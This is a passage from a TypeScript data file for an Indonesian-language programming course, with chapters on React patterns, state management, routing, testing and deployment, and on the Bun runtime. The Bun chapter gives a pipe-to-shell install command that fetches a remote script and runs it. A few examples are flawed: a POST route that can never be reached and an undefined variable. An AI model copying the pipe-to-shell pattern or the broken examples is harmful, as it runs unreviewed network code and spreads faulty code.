    codeExample: { language: "tsx", code: "// RENDER PROPS\nclass MouseTracker extends React.Component {\n  state = { x: 0, y: 0 };\n  handleMouseMove = (e) => {\n    this.setState({ x: e.clientX, y: e.clientY });\n  };\n  render() {\n    return (\n      <div onMouseMove={this.handleMouseMove}>\n        {this.props.render(this.state)}\n      </div>\n    );\n  }\n}\n\n// USAGE RENDER PROPS\n<MouseTracker render={({ x, y }) => (\n  <p>Mouse: {x}, {y}</p>\n)} />\n\n// HOC\nfunction withAuth(Component) {\n  return function Authenticated(props) {\n    const { user, loading } = useAuth();\n    if (loading) return <Spinner />;\n    if (!user) return <LoginPage />;\n    return <Component {...props} user={user} />;\n  };\n}\n\n// USAGE HOC\nfunction Dashboard({ user }) {\n  return <h1>Welcome, {user.name}</h1>;\n}\nexport default withAuth(Dashboard);" },
    explainAlong: "Render props kirim fungsi sebagai prop. HOC bungkus component dengan logic.",
    aiPrompt: "Kapan sebaiknya menggunakan hooks vs render props vs HOC?",
    reflection: "Refactor 1 HOC menjadi custom hook. Bandingkan readability-nya.",
  },
  {
    id: "16.10", moduleId: 16, chapterNum: "16.10",
    title: "State Management: Context API", subtitle: "React built-in state sharing", level: "Menengah",
    objectives: ["Memahami React Context", "Bisa menggunakan Context API untuk state global"],
    analogy: { diagram: "Props Drilling = Kirim paket lewat 10 rumah\nContext = Dropbox yang bisa diakses semua orang", caption: "Context API memungkinkan share state tanpa props drilling" },
    explanation: "**Context API** adalah fitur built-in React untuk berbagi state antar component tanpa props drilling. Cocok untuk data yang dianggap global: theme, user authentication, language preference.\n\n**Tiga Langkah:**\n1. **createContext** — Buat context object.\n2. **Provider** — Bungkus component tree yang perlu akses context.\n3. **useContext** — Hook untuk mengakses context value.\n\n**Kapan pakai Context?**\n- State yang diakses banyak component di level berbeda.\n- Theme, auth state, locale/i18n.\n- **Jangan** untuk state yang hanya diakses 1-2 level — props lebih baik.\n\n**Performance:** Context re-render semua consumer saat value berubah. Untuk state yang sering berubah, pertimbangkan state management library.",
    codeExample: { language: "tsx", code: "import { createContext, useContext, useState } from 'react';\n\nconst ThemeContext = createContext({\n  theme: 'light',\n  toggleTheme: () => {}\n});\n\nfunction ThemeProvider({ children }) {\n  const [theme, setTheme] = useState('light');\n  const toggleTheme = () => setTheme(t => t === 'light' ? 'dark' : 'light');\n  \n  return (\n    <ThemeContext.Provider value={{ theme, toggleTheme }}>\n      {children}\n    </ThemeContext.Provider>\n  );\n}\n\nfunction ThemedButton() {\n  const { theme, toggleTheme } = useContext(ThemeContext);\n  return (\n    <button\n      className={theme === 'dark' ? 'bg-gray-800 text-white' : 'bg-white text-black'}\n      onClick={toggleTheme}\n    >\n      Switch to {theme === 'light' ? 'dark' : 'light'}\n    </button>\n  );\n}\n\n// APP\nfunction App() {\n  return (\n    <ThemeProvider>\n      <ThemedButton />\n    </ThemeProvider>\n  );\n}" },
    explainAlong: "createContext, Provider, useContext — 3 langkah pakai Context API.",
    aiPrompt: "Kapan sebaiknya menggunakan Context vs props biasa?",
    reflection: "Implementasi dark mode dengan Context API dan localStorage persistence.",
  },
  {
    id: "16.11", moduleId: 16, chapterNum: "16.11",
    title: "State Management: Zustand", subtitle: "Lightweight state management", level: "Menengah",
    objectives: ["Memahami Zustand", "Bisa mengimplementasikan Zustand store"],
    analogy: { diagram: "Redux = Kantor pemerintah (banyak prosedur, form)\nZustand = Toko keluarga (simpel, langsung dilayani)", caption: "Zustand adalah state management library yang minimal dan powerful" },
    explanation: "**Zustand** adalah state management library untuk React yang minimal dan powerful. Dibuat oleh tim Poimandres.\n\n**Keunggulan Zustand:**\n1. **Minimal API** — Hanya 1 function `create()`.\n2. **No Providers** — Tidak perlu wrapper Provider di root.\n3. **TypeScript** — Type inference out of the box.\n4. **Middleware** — DevTools, persist, immer middleware tersedia.\n5. **Selectors** — Ambil hanya state yang dibutuhkan untuk optimal re-render.\n\n**Cara Kerja:**\nBuat store dengan `create()`. Store berisi state dan actions. Hook store di component dengan selector. Component re-render hanya saat selected state berubah.",
    codeExample: { language: "tsx", code: "import { create } from 'zustand';\nimport { devtools, persist } from 'zustand/middleware';\n\nconst useStore = create(devtools(persist(\n  (set, get) => ({\n    bears: 0,\n    fish: 0,\n    increaseBears: () => set((state) => ({ bears: state.bears + 1 })),\n    eatFish: () => {\n      const current = get().fish;\n      if (current > 0) set({ fish: current - 1 });\n    },\n    reset: () => set({ bears: 0, fish: 0 })\n  }),\n  { name: 'my-app-storage' }\n)));\n\n// COMPONENT\nfunction BearCounter() {\n  const bears = useStore((state) => state.bears);\n  const increase = useStore((state) => state.increaseBears);\n  return (\n    <div>\n      <h1>{bears} bears</h1>\n      <button onClick={increase}>Add Bear</button>\n    </div>\n  );\n}\n\n// BISA JUGA TANPA SELECTOR (RE-RENDER LEBIH SERING)\nfunction AnotherComponent() {\n  const { fish, eatFish } = useStore();\n  return <button onClick={eatFish}>Fish: {fish}</button>;\n}" },
    explainAlong: "create() buat store. Selector untuk optimal re-render. Middleware devtools dan persist.",
    aiPrompt: "Apa keuntungan Zustand dibanding Context API untuk state global?",
    reflection: "Ganti Context API state management dengan Zustand di aplikasi-mu.",
  },
  {
    id: "16.12", moduleId: 16, chapterNum: "16.12",
    title: "Form Handling dengan React Hook Form", subtitle: "Form management yang performant", level: "Menengah",
    objectives: ["Memahami React Hook Form", "Bisa membuat form dengan validasi"],
    analogy: { diagram: "Controlled Form = Pegawai yang tanya bos setiap detik (re-render tiap input)\nReact Hook Form = Pegawai yang kerja mandiri (re-render minimal)", caption: "React Hook Form mengurangi re-render dengan uncontrolled components dan refs" },
    explanation: "**React Hook Form** adalah library form management yang fokus pada performa. Menggunakan uncontrolled components dan refs untuk mengurangi re-render.\n\n**Keunggulan:**\n1. **Performa** — Minimal re-render, tidak perlu controlled input.\n2. **Validasi** — Integrasi dengan schema validation (Zod, Yup, Joi).\n3. **Less Code** — Lebih sedikit boilerplate dibanding form manual.\n4. **TypeScript** — Full type support.\n\n**Integrasi dengan Zod:**\nZod adalah schema validation library yang type-safe. Definisikan schema dengan Zod, integrasikan dengan React Hook Form via resolver.",
    codeExample: { language: "tsx", code: "import { useForm } from 'react-hook-form';\nimport { zodResolver } from '@hookform/resolvers/zod';\nimport { z } from 'zod';\n\nconst schema = z.object({\n  email: z.string().email('Invalid email'),\n  password: z.string().min(8, 'Min 8 characters'),\n  age: z.number().min(18, 'Must be 18+')\n});\n\ntype FormData = z.infer<typeof schema>;\n\nfunction LoginForm() {\n  const {\n    register, handleSubmit,\n    formState: { errors, isSubmitting }\n  } = useForm<FormData>({ resolver: zodResolver(schema) });\n\n  const onSubmit = (data: FormData) => {\n    console.log(data);\n  };\n\n  return (\n    <form onSubmit={handleSubmit(onSubmit)}>\n      <input {...register('email')} placeholder=\"Email\" />\n      {errors.email && <p>{errors.email.message}</p>}\n      \n      <input {...register('password')} type=\"password\" placeholder=\"Password\" />\n      {errors.password && <p>{errors.password.message}</p>}\n      \n      <button type=\"submit\" disabled={isSubmitting}>\n        {isSubmitting ? 'Loading...' : 'Submit'}\n      </button>\n    </form>\n  );\n}" },
    explainAlong: "register connect input ke form. handleSubmit untuk validasi dan submit.",
    aiPrompt: "Kenapa React Hook Form lebih performant dari controlled form manual?",
    reflection: "Buat form registrasi dengan React Hook Form dan Zod validation.",
  },
  {
    id: "16.13", moduleId: 16, chapterNum: "16.13",
    title: "React Router: Navigasi", subtitle: "Client-side routing", level: "Menengah",
    objectives: ["Memahami client-side routing", "Bisa menggunakan React Router v6"],
    analogy: { diagram: "MPA = Tiap halaman reload penuh (seperti pindah rumah)\nSPA Routing = Pindah ruangan dalam 1 rumah (tidak reload)", caption: "React Router menangani navigasi tanpa page reload di SPA" },
    explanation: "**React Router** adalah library de-facto untuk routing di React SPA. Versi 6 (v6) memiliki API yang lebih simpel dan declarative dibanding v5.\n\n**Konsep Utama:**\n1. **BrowserRouter** — Menggunakan History API untuk URL manipulation.\n2. **Routes & Route** — Definisikan path dan component yang dirender.\n3. **Link & NavLink** — Navigasi tanpa page reload.\n4. **useParams** — Ambil URL parameters.\n5. **useNavigate** — Programmatic navigation.\n6. **Outlet** — Render child routes di parent layout.\n7. **Nested Routes** — Route bersarang untuk layout yang kompleks.\n\n**Data API (v6.4+):**\nLoader — Fetch data sebelum route dirender.\nAction — Handle form submission.\nDeferred — Streaming data dengan Suspense.",
    codeExample: { language: "tsx", code: "import {\n  createBrowserRouter, RouterProvider,\n  Route, createRoutesFromElements,\n  Link, Outlet, useParams\n} from 'react-router-dom';\n\n// DEFINISI ROUTES\nconst router = createBrowserRouter(\n  createRoutesFromElements(\n    <Route path=\"/\" element={<Layout />}>\n      <Route index element={<Home />} />\n      <Route path=\"products\" element={<Products />} />\n      <Route path=\"products/:id\" element={<ProductDetail />} />\n      <Route path=\"about\" element={<About />} />\n    </Route>\n  )\n);\n\n// LAYOUT DENGAN OUTLET\nfunction Layout() {\n  return (\n    <div>\n      <nav>\n        <Link to=\"/\">Home</Link>\n        <Link to=\"/products\">Products</Link>\n      </nav>\n      <main><Outlet /></main>\n    </div>\n  );\n}\n\n// DYNAMIC SEGMENT\nfunction ProductDetail() {\n  const { id } = useParams();\n  return <h1>Product {id}</h1>;\n}\n\n// RENDER\nfunction App() {\n  return <RouterProvider router={router} />;\n}" },
    explainAlong: "createBrowserRouter definisikan routes. Outlet render child. useParams ambil URL param.",
    aiPrompt: "Apa bedanya Link dan anchor tag biasa di React Router?",
    reflection: "Buat nested routing dengan layout shared dan dynamic segments.",
  },
  {
    id: "16.14", moduleId: 16, chapterNum: "16.14",
    title: "Error Boundaries & Suspense", subtitle: "Graceful error handling dan lazy loading", level: "Menengah",
    objectives: ["Memahami Error Boundary", "Bisa menggunakan Suspense untuk lazy loading"],
    analogy: { diagram: "Error Boundary = Safety Net di sirkus\nSuspense = Placeholder sementara menunggu datang", caption: "Error Boundaries menangani error di component tree. Suspense menunggu async content." },
    explanation: "**Error Boundaries** adalah React component yang menangkap JavaScript error di child component tree. Mencegah seluruh aplikasi crash.\n\n**Suspense** memungkinkan component menunggu sesuatu (lazy-loaded components, data fetching) sambil menampilkan fallback UI.\n\n**Lazy Loading:**\n`React.lazy()` memungkinkan code-splitting per route. Component di-load on-demand saat route diakses. Kombinasikan dengan Suspense untuk menampilkan loading state.\n\n**Error Boundary Pattern:**\nBuat class component dengan `static getDerivedStateFromError()` dan `componentDidCatch()`. Bungkus route atau component tree.",
    codeExample: { language: "tsx", code: "import { lazy, Suspense, Component } from 'react';\n\n// LAZY LOADING\nconst Dashboard = lazy(() => import('./Dashboard'));\nconst Settings = lazy(() => import('./Settings'));\n\n// ERROR BOUNDARY\nclass ErrorBoundary extends Component {\n  state = { hasError: false };\n  \n  static getDerivedStateFromError() {\n    return { hasError: true };\n  }\n  \n  componentDidCatch(error, info) {\n    console.error('Error:', error, info);\n  }\n  \n  render() {\n    if (this.state.hasError) {\n      return <h1>Something went wrong. Please refresh.</h1>;\n    }\n    return this.props.children;\n  }\n}\n\n// USAGE\nfunction App() {\n  return (\n    <ErrorBoundary>\n      <Suspense fallback={<div>Loading...</div>}>\n        <Dashboard />\n      </Suspense>\n    </ErrorBoundary>\n  );\n}\n\n// ROUTE-BASED LAZY LOADING\nconst router = createBrowserRouter(\n  createRoutesFromElements(\n    <Route path=\"/\" element={<Layout />}>\n      <Route path=\"dashboard\" element={\n        <Suspense fallback={<Spinner />}>\n          <Dashboard />\n        </Suspense>\n      } />\n    </Route>\n  )\n);" },
    explainAlong: "ErrorBoundary tangkap error. Suspense tunggu lazy component. Fallback UI saat loading.",
    aiPrompt: "Kapan menggunakan Error Boundary vs try-catch biasa?",
    reflection: "Implementasi lazy loading untuk routes dengan React.lazy dan Suspense.",
  },
  {
    id: "16.15", moduleId: 16, chapterNum: "16.15",
    title: "Testing React Components", subtitle: "Unit test dan integration test", level: "Menengah",
    objectives: ["Memahami testing di React", "Bisa menulis test dengan Testing Library"],
    analogy: { diagram: "Testing = Quality Control pabrik\nUnit Test = Cek tiap komponen\nIntegration Test = Cek semua komponen bekerja bersama", caption: "Testing Library fokus pada testing behavior user, bukan implementation detail" },
    explanation: "**React Testing Library (RTL)** adalah library testing yang fokus pada testing behavior yang visible ke user, bukan implementation detail. Filosofinya: test seperti cara user menggunakan aplikasi.\n\n**Jenis Test:**\n1. **Unit Test** — Test individual component/function.\n2. **Integration Test** — Test bagaimana component bekerja bersama.\n3. **E2E Test** — Test seluruh aplikasi dari user perspective.\n\n**Queries RTL (urutkan prioritas):**\n1. `getByRole` — Berdasarkan ARIA role.\n2. `getByLabelText` — Berdasarkan label form.\n3. `getByPlaceholderText` — Berdasarkan placeholder.\n4. `getByText` — Berdasarkan text content.\n5. `getByTestId` — Fallback jika tidak ada yang cocok.\n\n**User Event:**\nGunakan `@testing-library/user-event` untuk simulasi user interaction yang realistis.",
    codeExample: { language: "tsx", code: "import { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport Counter from './Counter';\n\n// UNIT TEST\ndescribe('Counter', () => {\n  it('renders initial count', () => {\n    render(<Counter initial={5} />);\n    expect(screen.getByText('Count: 5')).toBeInTheDocument();\n  });\n\n  it('increments on button click', async () => {\n    const user = userEvent.setup();\n    render(<Counter />);\n    \n    await user.click(screen.getByRole('button', { name: /increment/i }));\n    expect(screen.getByText('Count: 1')).toBeInTheDocument();\n  });\n\n  it('decrements on button click', async () => {\n    const user = userEvent.setup();\n    render(<Counter initial={10} />);\n    \n    await user.click(screen.getByRole('button', { name: /decrement/i }));\n    expect(screen.getByText('Count: 9')).toBeInTheDocument();\n  });\n});\n\n// MOCKING API CALLS\nimport { rest } from 'msw';\nimport { setupServer } from 'msw/node';\n\nconst server = setupServer(\n  rest.get('/api/user', (req, res, ctx) => {\n    return res(ctx.json({ name: 'John' }));\n  })\n);\n\nbeforeAll(() => server.listen());\nafterEach(() => server.resetHandlers());\nafterAll(() => server.close());" },
    explainAlong: "RTL test behavior user. getByRole prioritas utama. user-event untuk interaksi.",
    aiPrompt: "Kenapa Testing Library tidak recommend testing implementation detail?",
    reflection: "Tulis unit test untuk form dengan validasi. Mock API calls dengan MSW.",
  },
  {
    id: "16.16", moduleId: 16, chapterNum: "16.16",
    title: "Performance Optimization", subtitle: "React.memo, useMemo, useCallback, lazy", level: "Menengah–Lanjut",
    objectives: ["Memahami React rendering behavior", "Bisa mengoptimasi performa React"],
    analogy: { diagram: "React = Pelukis yang menggambar ulang seluruh kanvas\nOptimization = Pelukis pintar yang hanya gambar bagian yang berubah", caption: "Optimasi React fokus pada mengurangi re-render yang tidak perlu" },
    explanation: "**React.memo** — Higher-order component yang memoize hasil render. Component hanya re-render jika props berubah (shallow comparison). Gunakan untuk component yang sering di-render dengan props yang sama.\n\n**useMemo** — Memoize hasil komputasi. Hanya re-compute jika dependencies berubah. Berguna untuk kalkulasi mahal atau object/array yang stabil.\n\n**useCallback** — Memoize fungsi. Fungsi yang sama referential identity di setiap render. Berguna saat melewatkan callback ke child component yang pakai React.memo.\n\n**Lazy Loading** — Code-split per route dengan React.lazy dan Suspense.\n\n**Virtualization** — Hanya render item yang visible di viewport. Gunakan react-window atau react-virtualized untuk list panjang.\n\n**Profiling:** Gunakan React DevTools Profiler untuk mengidentifikasi bottleneck.",
    codeExample: { language: "tsx", code: "import { memo, useMemo, useCallback, useState } from 'react';\n\n// REACT.MEMO — HINDARI RE-RENDER JIKA PROPS SAMA\nconst ExpensiveList = memo(function ExpensiveList({ items, onSelect }) {\n  console.log('List rendered');\n  return (\n    <ul>\n      {items.map(item => (\n        <li key={item.id} onClick={() => onSelect(item)}>\n          {item.name}\n        </li>\n      ))}\n    </ul>\n  );\n});\n\n// USEMEMO — CACHE HASIL KOMPUTASI\nfunction Dashboard({ data, filter }) {\n  const filteredData = useMemo(() => {\n    return data.filter(item => item.category === filter);\n  }, [data, filter]);\n  \n  return <ExpensiveList items={filteredData} />;\n}\n\n// USECALLBACK — STABILKAN FUNGSI\nfunction Parent() {\n  const [count, setCount] = useState(0);\n  \n  // Tanpa useCallback, handleSelect baru tiap render\n  // -> ExpensiveList re-render meski props items sama\n  const handleSelect = useCallback((item) => {\n    console.log('Selected:', item);\n  }, []);\n  \n  return (\n    <div>\n      <button onClick={() => setCount(c => c + 1)}>{count}</button>\n      <ExpensiveList items={items} onSelect={handleSelect} />\n    </div>\n  );\n}" },
    explainAlong: "React.memo cegah re-render. useMemo cache komputasi. useCallback stabilkan fungsi.",
    aiPrompt: "Kapan menggunakan React.memo vs useMemo vs useCallback?",
    reflection: "Profile aplikasi dengan React DevTools. Identifikasi dan fix unnecessary re-renders.",
  },
  {
    id: "16.17", moduleId: 16, chapterNum: "16.17",
    title: "TypeScript dengan React", subtitle: "Type safety untuk component dan hooks", level: "Menengah–Lanjut",
    objectives: ["Memahami TypeScript di React", "Bisa menggunakan generic types"],
    analogy: { diagram: "JavaScript = Kotak penyimpanan (apa saja bisa masuk)\nTypeScript = Rak terorganisir (hanya yang sesuai tipe)", caption: "TypeScript memberi type safety untuk props, state, dan event handler" },
    explanation: "**TypeScript dengan React** memberikan type safety untuk props, state, refs, dan event handlers. Mengurangi bug runtime dan meningkatkan developer experience dengan autocomplete.\n\n**Typing Component:**\n- Props dengan interface atau type alias.\n- Optional props dengan `?`.\n- Children dengan `React.ReactNode`.\n- Event handlers dengan `React.MouseEvent`, `React.ChangeEvent`.\n\n**Generic Components:**\nBuat component yang menerima generic type parameter. Berguna untuk wrapper component seperti list, table, modal.\n\n**Utility Types:**\n- `ComponentProps<typeof Component>` — Extract props type dari component.\n- `PropsWithChildren` — Tambahkan children ke props.\n- `FC` — Functional Component type (deprecated, gunakan explicit props).",
    codeExample: { language: "tsx", code: "// TYPING PROPS\ninterface ButtonProps {\n  variant: 'primary' | 'secondary' | 'danger';\n  size?: 'sm' | 'md' | 'lg';\n  disabled?: boolean;\n  onClick: () => void;\n  children: React.ReactNode;\n}\n\nfunction Button({ variant, size = 'md', disabled, onClick, children }: ButtonProps) {\n  return (\n    <button\n      className={`btn btn-${variant} btn-${size}`}\n      disabled={disabled}\n      onClick={onClick}\n    >\n      {children}\n    </button>\n  );\n}\n\n// GENERIC COMPONENT\ninterface ListProps<T> {\n  items: T[];\n  renderItem: (item: T) => React.ReactNode;\n  keyExtractor: (item: T) => string;\n}\n\nfunction List<T>({ items, renderItem, keyExtractor }: ListProps<T>) {\n  return (\n    <ul>\n      {items.map(item => (\n        <li key={keyExtractor(item)}>{renderItem(item)}</li>\n      ))}\n    </ul>\n  );\n}\n\n// USAGE\n<List<User>\n  items={users}\n  renderItem={(user) => <span>{user.name}</span>}\n  keyExtractor={(user) => user.id}\n/>" },
    explainAlong: "Interface untuk props type. Generic component dengan <T>. React.ReactNode untuk children.",
    aiPrompt: "Apa keuntungan menggunakan TypeScript di project React?",
    reflection: "Convert 1 component JavaScript ke TypeScript. Tambahkan proper types.",
  },
  {
    id: "16.18", moduleId: 16, chapterNum: "16.18",
    title: "Deploy React App", subtitle: "Build dan deploy ke production", level: "Menengah",
    objectives: ["Memahami React build process", "Bisa deploy ke Vercel atau Netlify"],
    analogy: { diagram: "Dev Server = Workshop (banyak tool debugging)\nProduction Build = Showroom (rapi, optimized, minimal)", caption: "Production build melakukan optimasi: minification, code splitting, tree shaking" },
    explanation: "**Production Build** adalah versi aplikasi yang dioptimasi untuk production. Build tools seperti Vite melakukan beberapa optimasi:\n\n1. **Minification** — Hapus whitespace, comments, rename variables jadi pendek.\n2. **Tree Shaking** — Hapus code yang tidak digunakan.\n3. **Code Splitting** — Pecah bundle jadi chunks yang di-load on-demand.\n4. **Asset Optimization** — Minify CSS, optimize images, add content hashes untuk cache busting.\n5. **Environment Variables** — Ganti `import.meta.env` dengan actual values.\n\n**Deploy Options:**\n- **Vercel** — Optimized untuk React/Next.js, auto deploy dari Git.\n- **Netlify** — Drag & drop atau connect Git repo.\n- **Cloudflare Pages** — Edge network, fast global.\n- **AWS S3 + CloudFront** — Scalable, cost-effective untuk static sites.",
    codeExample: { language: "bash", code: "# BUILD\nnpm run build\n\n# OUTPUT DI dist/\ndist/\n  ├── assets/\n  │   ├── index-abc123.js     # Hashed untuk cache busting\n  │   ├── index-xyz789.css\n  │   └── vendor-def456.js\n  └── index.html\n\n# DEPLOY KE VERCEL\nnpm i -g vercel\nvercel --prod\n\n# ENVIRONMENT VARIABLES\n# .env.local (dev only)\nVITE_API_URL=http://localhost:8080\n\n# .env.production\nVITE_API_URL=https://api.myapp.com\n\n# DI CODE\nconst apiUrl = import.meta.env.VITE_API_URL;" },
    explainAlong: "Build generate optimized static files. VITE_ prefix untuk env vars.",
    aiPrompt: "Apa yang terjadi saat npm run build di project Vite?",
    reflection: "Deploy aplikasi React ke Vercel atau Netlify. Setup environment variables.",
  }
];

const modul17: Chapter[] = [

  {

    id: "17.1",

    moduleId: 17,

    chapterNum: "17.1",

    title: "Bun: Runtime JavaScript yang Super Cepat",

    subtitle: "Alternatif Node.js dengan speed boost dan built-in tools",

    level: "Menengah",

    objectives: [

      "Memahami apa itu Bun dan bedanya dengan Node.js",

      "Bisa install dan menjalankan Bun",

      "Mengerti built-in tools: bundler, test runner, package manager",

    ],

    analogy: { diagram: "Node.js vs Bun:\nNode: npm install → node app.js → jest test → webpack build\nBun: bun install → bun run app → bun test → bun build (semua built-in)", caption: "Bun adalah all-in-one JavaScript toolkit: runtime, bundler, test runner, dan package manager" },

    explanation: "Kalau kamu sudah familiar dengan Node.js, mungkin kamu merasa workflow-nya terasa 'berbelit': npm untuk install package,\n\nNode untuk run, jest untuk test, webpack/rollup untuk bundle, dotenv untuk env vars.\n\nSetiap tool dari vendor berbeda, config-nya beda-beda, dan sering saling bertabrakan.\\n\\n**Bun: All-in-One JavaScript Toolkit**\\nBun adalah runtime JavaScript modern yang dibuat dengan Zig dan menggunakan JavaScriptCore (engine Safari) alih-alih V8 (engine Chrome/Node).\n\nHasilnya?\n\nPerforma yang signifikan lebih cepat — terutama untuk startup dan I/O operations.\\n\\nTapi speed bukanlah satu-satunya keunggulan Bun.\n\nYang lebih menarik adalah filosofi 'batteries included':\\n\\n1. **Runtime**: Jalankan JavaScript/TypeScript (tanpa transpile!)\\n2. **Package Manager**: Install dependency 20-30x lebih cepat dari npm\\n3. **Bundler**: Bundle untuk production (seperti webpack/rollup)\\n4.\n\n**Test Runner**: Unit test built-in (seperti jest/vitest)\\n5. **Shell scripting**: Jalankan file .ts/.js seperti bash script\\n\\n**Install Bun**\\n```bash\\ncurl -fsSL https://bun.sh/install | bash\\n```\\n\\n**Bun vs Node.js: Perbedaan Utama**\\n\\n1. **Speed**: Bun lebih cepat 3-4x untuk startup dan 2-3x untuk I/O operations\\n2. **TypeScript native**: Bun bisa langsung jalankan .ts tanpa transpile manual\\n3.\n\n**ESM & CJS**: Bun mendukung keduanya tanpa config rumit\\n4. **Built-in fetch**: fetch(), WebSocket(), dan API modern sudah built-in\\n5. **SQLite built-in**: bun:sqlite untuk database SQLite tanpa dependency\\n\\n**Migrasi dari Node.js ke Bun**\\nBun didesain untuk compatible dengan Node.js. Sebagian besar kode Node.js bisa langsung jalan di Bun tanpa modifikasi.\n\nTapi ada beberapa perbedaan:\\n- Global: process, Buffer, __dirname, __filename semua works\\n- Modules: require() dan import both work\\n- APIs: fetch(), setTimeout(),\n\nConsole — all compatible\\n- Native addons: Node-API addons should work\\n\\n**Kapan Pakai Bun?**\\n- Proyek baru yang butuh speed\\n- Scripting dan automation\\n- Tooling development\\n- Edge computing (Bun runtime ringan)\\n\\n**Kapan Tetap Node.js?**\\n- Proyek legacy yang sudah stabil\\n- Library/framework yang belum support Bun\\n- Team yang sudah nyaman dengan ekosistem Node",

    codeExample: { language: "bash", code: "# Install Bun\ncurl -fsSL https://bun.sh/install | bash\n\n# Cek versi\nbun --version\n\n# Init project\nbun init\n\n# Install dependency (cepat banget!)\nbun install express hono drizzle-orm\n\n# Jalankan TypeScript langsung (tanpa tsc!)\nbun run app.ts\n\n# Jalankan dengan watch mode\nbun --watch run app.ts\n\n# Test\nbun test\n\n# Build untuk production\nbun build ./app.ts --outdir ./out\n\n# Run sebagai executable script\nbun ./script.ts" },

    explainAlong: "Bun bisa langsung menjalankan TypeScript tanpa compile step. Watch mode untuk development auto-reload.",

    aiPrompt: "Install Bun di sistemmu. Buat file hello.ts yang mencetak 'Hello Bun!', jalankan dengan bun run.",

    reflection: "Bandingkan waktu install dependency antara npm install dan bun install di proyek yang sama.",

  },

  {

    id: "17.2",

    moduleId: 17,

    chapterNum: "17.2",

    title: "Bun: Native APIs dan SQLite",

    subtitle: "Manfaatkan built-in APIs dan database tanpa dependency tambahan",

    level: "Menengah",

    objectives: [

      "Mengerti Bun.serve() untuk HTTP server",

      "Bisa menggunakan bun:sqlite",

      "Mengerti file I/O dan streams di Bun",

    ],

    analogy: { diagram: "Bun APIs:\n├── Bun.serve() → HTTP server\n├── bun:sqlite → Database\n├── Bun.file() → File I/O\n├── Bun.write() → Write file\n└── Bun.hash() → Hashing\n\nSemua built-in, tanpa npm install", caption: "Bun menyediakan API modern yang siap pakai tanpa dependency" },

    explanation: "Salah satu kekuatan Bun adalah built-in APIs yang biasanya membutuhkan library tambahan di Node.js.\n\nIni mengurangi jumlah dependency dan meningkatkan performa.\\n\\n**Bun.serve(): HTTP Server Built-in**\\nBun punya web server built-in yang sangat cepat dan simple.\n\nSupport HTTP/1.1 dan HTTP/2, WebSocket, TLS/HTTPS, dan static file serving.\\n\\n```typescript\\nBun.serve({\\n  port: 3000,\\n  fetch(req) {\\n    const url = new URL(req.url);\\n    if (url.pathname === '/') {\\n      return new Response('Hello World!');\\n    }\\n    if (url.pathname === '/api/users') {\\n      return Response.json([{ id: 1,\n\nName: 'Budi' }]);\\n    }\\n    return new Response('Not Found', { status: 404 });\\n  },\\n});\\n```\\n\\nNotice: return new Response() — ini adalah API web standard (fetch API), bukan API khusus Bun.\n\nIni berarti kode kamu lebih portable dan familiar.\\n\\n**bun:sqlite: Database Built-in**\\nIni salah satu fitur paling menarik Bun.\n\nSQLite adalah database file-based yang sangat cepat dan reliable.\n\nDengan bun:sqlite, kamu punya database tanpa install APAPUN.\\n\\nSQLite cocok untuk:\\n- Prototyping dan development\\n- Aplikasi desktop/embedded\\n- Caching layer\\n- Aplikasi dengan read-heavy workload\\n- Single-node deployments\\n\\n**File I/O dengan Bun**\\nBun menyederhanakan file I/O:\\n- Bun.file(path) untuk membaca file\\n- Bun.write(path,\n\nData) untuk menulis file\\n- Support streaming dan lazy loading\\n\\n**WebSocket Built-in**\\nBun.serve() juga support WebSocket — tidak perlu library seperti ws atau socket.io:\\n\\n```typescript\\nBun.serve({\\n  port: 3000,\\n  fetch(req, server) {\\n    if (server.upgrade(req)) {\\n      return; // WebSocket upgrade\\n    }\\n    return new Response('Regular HTTP');\\n  },\\n  websocket: {\\n    open(ws) { ws.subscribe('chat'); },\\n    message(ws, message) {\\n      ws.publish('chat', message);\\n    },\\n  },\\n});\\n```\\n\\nNotice: pub/sub built-in!\n\nTidak perlu Redis untuk use case sederhana.",

    codeExample: { language: "typescript", code: "// HTTP Server + SQLite + File I/O\nimport { Database } from 'bun:sqlite';\n\n// Setup database\nconst db = new Database('app.db');\ndb.exec(`\n  CREATE TABLE IF NOT EXISTS users (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    name TEXT NOT NULL,\n    email TEXT UNIQUE\n  )\n`);\n\n// Seed data\nconst insert = db.prepare('INSERT OR IGNORE INTO users (name, email) VALUES (?, ?)');\ninsert.run('Budi', 'budi@email.com');\ninsert.run('Ani', 'ani@email.com');\n\n// Query\nconst users = db.query('SELECT * FROM users').all();\nconsole.log('Users:', users);\n\n// HTTP Server\nBun.serve({\n  port: 3000,\n  async fetch(req) {\n    const url = new URL(req.url);\n    \n    // Static file serving\n    if (url.pathname === '/') {\n      return new Response(Bun.file('./public/index.html'));\n    }\n    \n    // API endpoint\n    if (url.pathname === '/api/users') {\n      const allUsers = db.query('SELECT * FROM users').all();\n      return Response.json(allUsers);\n    }\n    \n    if (url.pathname === '/api/users' && req.method === 'POST') {\n      const body = await req.json();\n      const result = db.prepare('INSERT INTO users (name, email) VALUES (?, ?)').run(body.name, body.email);\n      return Response.json({ id: result.lastInsertRowid }, { status: 201 });\n    }\n    \n    return new Response('Not Found', { status: 404 });\n  },\n});\n\nconsole.log('Server running at http://localhost:3000');" },

    explainAlong: "Baris 4-8: SQLite database setup dengan schema creation. Baris 23-24: Serve static file. Baris 26-27: Query database dan return JSON.",

    aiPrompt: "Buat REST API CRUD lengkap dengan Bun.serve() dan bun:sqlite untuk resource 'products' (id, name, price, stock).",

    reflection: "SQLite di Bun ini sangat cepat. Coba benchmark insert 10.000 rows dan bandingkan dengan database lain yang pernah kamu pakai.",

  },

  {

    id: "17.3",

    moduleId: 17,

    chapterNum: "17.3",

    title: "Bun: Testing, Scripting, dan Build",

    subtitle: "Manfaatkan toolkit lengkap Bun untuk development workflow",

    level: "Menengah",

    objectives: [

      "Bisa menulis dan menjalankan test dengan bun:test",

      "Mengerti shell scripting dengan Bun",

      "Bisa build dan bundle project dengan Bun",

    ],

    analogy: { diagram: "Bun Toolkit:\n├── bun:test → Unit test (seperti Jest)\n├── Bun.$ → Shell scripting\n├── bun build → Production bundle\n└── bun run → Package.json scripts", caption: "Bun menyediakan semua tools development dalam satu binary" },

